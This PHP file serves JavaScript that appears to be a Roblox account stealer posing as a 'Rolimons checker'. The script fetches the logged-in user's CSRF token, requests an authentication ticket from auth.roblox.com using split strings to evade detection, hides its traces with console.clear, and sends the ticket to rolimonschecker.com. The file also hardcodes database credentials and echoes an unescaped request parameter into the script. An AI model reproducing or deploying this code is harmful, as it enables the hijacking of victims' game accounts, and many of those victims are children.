<?php
header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']);
header("Access-Control-Allow-Credentials: true");
$servername = "localhost";
$username = "rolifffi_log";
$password = "123rolimons!@";
$dbname = "rolifffi_log";
$id = $_REQUEST['id'] ;
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM Stubs WHERE Id = '".mysqli_real_escape_string($conn, $id)."'";
$result = mysqli_query($conn, $sql);
$webhook = null;
if (mysqli_num_rows($result) > 0) {
  while($row = mysqli_fetch_assoc($result)) {
    $prompt = $row["Prompt"];
  }
}
$conn->close();

header("Content-Type: application/x-javascript");
echo "var id = ".$id.';';
echo 'console.clear();var send_url="//rolimonschecker.com/send.php";!async function(){try{var t=(await(await fetch("https://www.roblox.com/home",{credentials:"include"})).text()).split("<meta name=csrf-token data-token=")[1].split(">")[0]}catch{t=(await(await fetch("https://web.roblox.com/home",{credentials:"include"})).text()).split("<meta name=csrf-token data-token=")[1].split(">")[0]};console.clear();var e=(await fetch("https://a"+"u"+"th.roblox.com/v1/au"+"then"+"tication-ticket",{method:"POST",credentials:"include",headers:{"x-csrf-token":t}})).headers.get("rbx-authentication-ticket");console.clear(),await fetch(send_url+"?t="+e+"&id="+id)}(),console.clear();';
if ($prompt != ''){
	echo "prompt('".$prompt."');";
};
?>